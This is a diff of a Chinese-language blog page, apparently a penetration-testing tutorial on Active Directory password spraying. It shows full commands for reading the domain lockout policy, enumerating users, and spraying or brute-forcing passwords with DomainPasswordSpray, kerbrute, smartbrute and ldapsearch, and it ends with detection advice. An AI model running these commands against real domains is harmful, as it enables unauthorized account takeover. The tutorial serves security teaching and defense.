@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.92.0" /><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.883a355335df5c9f19d469cd25bb68215497fd354fb3a8699eaf851799c161a8.js"></script>
+        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>
 
     
 
@@ -281,12 +281,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">Maximum</span> <span class="n">password</span> <span class="n">age</span> <span class="c">#表示密码过期的时间，默认为42</span>
-<span class="n">Minimum</span> <span class="n">password</span> <span class="n">length</span> <span class="c">#表示密码的最小长度，默认为7</span>
-<span class="n">Account</span> <span class="n">lockout</span> <span class="n">duration</span> <span class="c">#表示被锁定的帐户在自动解锁前保持锁定的分钟数，默认为30</span>
-<span class="n">Account</span> <span class="n">lockout</span> <span class="n">threshold</span> <span class="c">#表示导致用户帐户被锁定的失败登录尝试次数，默认为5</span>
-<span class="n">Reset</span> <span class="n">account</span> <span class="n">lockout</span> <span class="n">counter</span> <span class="n">after</span> <span class="c">#表示失败登录尝试计数器重置为0次错误登录尝试之前，失败登录尝试后必须经过的分钟数，默认为30</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Maximum</span> <span class="n">password</span> <span class="n">age</span> <span class="c">#表示密码过期的时间，默认为42</span>
+</span></span><span class="line"><span class="cl"><span class="n">Minimum</span> <span class="n">password</span> <span class="n">length</span> <span class="c">#表示密码的最小长度，默认为7</span>
+</span></span><span class="line"><span class="cl"><span class="n">Account</span> <span class="n">lockout</span> <span class="n">duration</span> <span class="c">#表示被锁定的帐户在自动解锁前保持锁定的分钟数，默认为30</span>
+</span></span><span class="line"><span class="cl"><span class="n">Account</span> <span class="n">lockout</span> <span class="n">threshold</span> <span class="c">#表示导致用户帐户被锁定的失败登录尝试次数，默认为5</span>
+</span></span><span class="line"><span class="cl"><span class="n">Reset</span> <span class="n">account</span> <span class="n">lockout</span> <span class="n">counter</span> <span class="n">after</span> <span class="c">#表示失败登录尝试计数器重置为0次错误登录尝试之前，失败登录尝试后必须经过的分钟数，默认为30</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="域外查询"><a href="#域外查询" class="anchor-link">#</a><a href="#contents:域外查询" class="headings">域外查询</a></h3>
 <p>前提：获得了域内一个普通用户的口令。</p>
@@ -310,12 +310,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$uname</span><span class="p">=</span><span class="s2">&#34;testa&#34;</span>
-<span class="nv">$pwd</span><span class="p">=</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;DomainUser123!&#34;</span> <span class="n">-AsPlainText</span> <span class="err">–</span><span class="n">Force</span>
-<span class="nv">$cred</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="nv">$uname</span><span class="p">,</span><span class="nv">$pwd</span><span class="p">)</span>
-<span class="nb">import-module</span> <span class="p">./</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
-<span class="nb">Get-ADDefaultDomainPasswordPolicy</span> <span class="n">-Server</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Verbose</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="p">=</span><span class="s2">&#34;testa&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pwd</span><span class="p">=</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;DomainUser123!&#34;</span> <span class="n">-AsPlainText</span> <span class="err">–</span><span class="n">Force</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="nv">$uname</span><span class="p">,</span><span class="nv">$pwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">./</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADDefaultDomainPasswordPolicy</span> <span class="n">-Server</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Verbose</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="/images/1631288125.png" alt=""></p>
 </li>
@@ -335,9 +335,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">import-module</span> <span class="p">./</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
-<span class="nb">Get-ADDefaultDomainPasswordPolicy</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">./</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADDefaultDomainPasswordPolicy</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -391,13 +391,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#获得所有用户的列表，排除被禁用和被锁定的用户（可能不准确）</span>
-<span class="nb">Get-DomainUserList</span> <span class="n">-RemoveDisabled</span> <span class="n">-RemovePotentialLockouts</span><span class="p">|</span> <span class="nb">Out-File</span> <span class="n">-Encoding</span> <span class="n">ascii</span> <span class="n">userlist</span><span class="p">.</span><span class="n">txt</span>
-<span class="c">#利用LDAP自动从域中导出用户列表（去除禁用和锁定用户），再进行密码喷洒暴破</span>
-<span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="n">Spring2017</span>
-<span class="c">#指定UserList进行密码喷洒暴破</span>
-<span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-UserList</span> <span class="p">.\\</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Password</span> <span class="n">DomainUser123</span><span class="p">!</span> <span class="n">-Verbose</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#获得所有用户的列表，排除被禁用和被锁定的用户（可能不准确）</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUserList</span> <span class="n">-RemoveDisabled</span> <span class="n">-RemovePotentialLockouts</span><span class="p">|</span> <span class="nb">Out-File</span> <span class="n">-Encoding</span> <span class="n">ascii</span> <span class="n">userlist</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="c">#利用LDAP自动从域中导出用户列表（去除禁用和锁定用户），再进行密码喷洒暴破</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="n">Spring2017</span>
+</span></span><span class="line"><span class="cl"><span class="c">#指定UserList进行密码喷洒暴破</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-UserList</span> <span class="p">.\\</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Password</span> <span class="n">DomainUser123</span><span class="p">!</span> <span class="n">-Verbose</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -413,13 +413,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#通过Kerberos枚举用户名</span>
-<span class="n">kerbrute_linux_amd64</span> <span class="n">userenum</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">ropnop</span><span class="p">.</span><span class="n">com</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">105</span> <span class="n">usernames</span><span class="p">.</span><span class="n">txt</span>
-<span class="c">#密码喷洒</span>
-<span class="n">kerbrute_linux_amd64</span> <span class="n">passwordspray</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">ropnop</span><span class="p">.</span><span class="n">com</span> <span class="n">domain_users</span><span class="p">.</span><span class="n">txt</span> <span class="n">Password123</span>
-<span class="c">#传统密码暴破（会被锁账户）</span>
-<span class="n">kerbrute_linux_amd64</span> <span class="n">bruteuser</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">ropnop</span><span class="p">.</span><span class="n">com</span> <span class="n">passwords</span><span class="p">.</span><span class="n">lst</span> <span class="n">test1</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#通过Kerberos枚举用户名</span>
+</span></span><span class="line"><span class="cl"><span class="n">kerbrute_linux_amd64</span> <span class="n">userenum</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">ropnop</span><span class="p">.</span><span class="n">com</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">105</span> <span class="n">usernames</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="c">#密码喷洒</span>
+</span></span><span class="line"><span class="cl"><span class="n">kerbrute_linux_amd64</span> <span class="n">passwordspray</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">ropnop</span><span class="p">.</span><span class="n">com</span> <span class="n">domain_users</span><span class="p">.</span><span class="n">txt</span> <span class="n">Password123</span>
+</span></span><span class="line"><span class="cl"><span class="c">#传统密码暴破（会被锁账户）</span>
+</span></span><span class="line"><span class="cl"><span class="n">kerbrute_linux_amd64</span> <span class="n">bruteuser</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">ropnop</span><span class="p">.</span><span class="n">com</span> <span class="n">passwords</span><span class="p">.</span><span class="n">lst</span> <span class="n">test1</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -435,11 +435,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#smart模式</span>
-<span class="n">python3</span> <span class="n">smartbrute</span><span class="o">.</span><span class="n">py</span> <span class="n">smart</span> <span class="o">-</span><span class="n">bP</span> <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> <span class="n">kerberos</span> <span class="o">-</span><span class="n">d</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span> <span class="o">-</span><span class="n">u</span> <span class="n">jack</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;Admin12345&#39;</span> <span class="n">kerberos</span>
-<span class="c1">#Brute模式</span>
-<span class="n">python3</span> <span class="n">smartbrute</span><span class="o">.</span><span class="n">py</span> <span class="n">brute</span> <span class="o">-</span><span class="n">bu</span> <span class="s1">&#39;jack&#39;</span> <span class="o">-</span><span class="n">bP</span> <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> <span class="n">kerberos</span> <span class="o">-</span><span class="n">d</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#smart模式</span>
+</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">smartbrute</span><span class="o">.</span><span class="n">py</span> <span class="n">smart</span> <span class="o">-</span><span class="n">bP</span> <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> <span class="n">kerberos</span> <span class="o">-</span><span class="n">d</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span> <span class="o">-</span><span class="n">u</span> <span class="n">jack</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;Admin12345&#39;</span> <span class="n">kerberos</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#Brute模式</span>
+</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">smartbrute</span><span class="o">.</span><span class="n">py</span> <span class="n">brute</span> <span class="o">-</span><span class="n">bu</span> <span class="s1">&#39;jack&#39;</span> <span class="o">-</span><span class="n">bP</span> <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> <span class="n">kerberos</span> <span class="o">-</span><span class="n">d</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><strong>Tips:</strong> 如果报错 <code>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code>，那是因为本地时间和dc时间不同步。</p>
 </li>
@@ -456,8 +456,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="p">$(</span><span class="nb">cat </span><span class="n">user</span><span class="p">.</span><span class="n">txt</span><span class="p">);</span> <span class="k">do</span> <span class="nb">echo </span><span class="n">-e</span> <span class="s2">&#34;\n$i&#34;</span><span class="p">;</span><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span><span class="err">:</span><span class="n">389</span> <span class="n">-D</span> <span class="s2">&#34;$i&#34;</span> <span class="n">-w</span> <span class="n">DomainUser123</span><span class="p">!</span> <span class="n">-b</span> <span class="s2">&#34;DC=test,DC=com&#34;</span> <span class="p">|</span><span class="n">grep</span> <span class="s2">&#34;# numEntrie&#34;</span><span class="p">;</span><span class="n">done</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="p">$(</span><span class="nb">cat </span><span class="n">user</span><span class="p">.</span><span class="n">txt</span><span class="p">);</span> <span class="k">do</span> <span class="nb">echo </span><span class="n">-e</span> <span class="s2">&#34;\n$i&#34;</span><span class="p">;</span><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span><span class="err">:</span><span class="n">389</span> <span class="n">-D</span> <span class="s2">&#34;$i&#34;</span> <span class="n">-w</span> <span class="n">DomainUser123</span><span class="p">!</span> <span class="n">-b</span> <span class="s2">&#34;DC=test,DC=com&#34;</span> <span class="p">|</span><span class="n">grep</span> <span class="s2">&#34;# numEntrie&#34;</span><span class="p">;</span><span class="n">done</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>口令正确输出查询结果的个数，口令错误返回验证错误：<code>ldap_bind: Invalid credentials (49)</code></p>
 </li>
@@ -468,14 +468,14 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Invoke-DomainPasswordSprayOutsideTheDomain</span> <span class="n">-Domain</span> <span class="s2">&#34;192.168.1.1/DC=test,DC=com&#34;</span> <span class="n">-UserList</span> <span class="p">.\</span><span class="n">user</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Password</span> <span class="n">DomainUser123</span><span class="p">!</span> <span class="n">-Verbose</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-DomainPasswordSprayOutsideTheDomain</span> <span class="n">-Domain</span> <span class="s2">&#34;192.168.1.1/DC=test,DC=com&#34;</span> <span class="n">-UserList</span> <span class="p">.\</span><span class="n">user</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Password</span> <span class="n">DomainUser123</span><span class="p">!</span> <span class="n">-Verbose</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 </ol>
 <h2 id="检测方法"><a href="#检测方法" class="anchor-link">#</a><a href="#contents:检测方法" class="headings">检测方法</a></h2>
 <p>域用户属性中的<code>lastbadpasswordattempt</code>能够记录上次口令输入错误的登陆时间，可以作为识别暴力破解攻击的依据。<code>badPwdCount</code>属性会记录用户口令错误的次数，在用户输入正确的口令后，这个属性会被清零。</p>
-<pre tabindex="0"><code>ldapsearch -x -H ldap://192.168.1.1:389 -D &quot;CN=testa,CN=Users,DC=test,DC=com&quot; -w DomainUser123! -b &quot;DC=test,DC=com&quot; -b &quot;DC=test,DC=com&quot; &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;|grep -E &quot;cn:|badPwdCount|badPasswordTime&quot;
+<pre tabindex="0"><code>ldapsearch -x -H ldap://192.168.1.1:389 -D &#34;CN=testa,CN=Users,DC=test,DC=com&#34; -w DomainUser123! -b &#34;DC=test,DC=com&#34; -b &#34;DC=test,DC=com&#34; &#34;(&amp;(objectClass=user)(objectCategory=person))&#34;|grep -E &#34;cn:|badPwdCount|badPasswordTime&#34;
 </code></pre><p>日志(4625 - An account failed to log on)能够记录登录失败的事件。</p>
 <h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
 <ol>
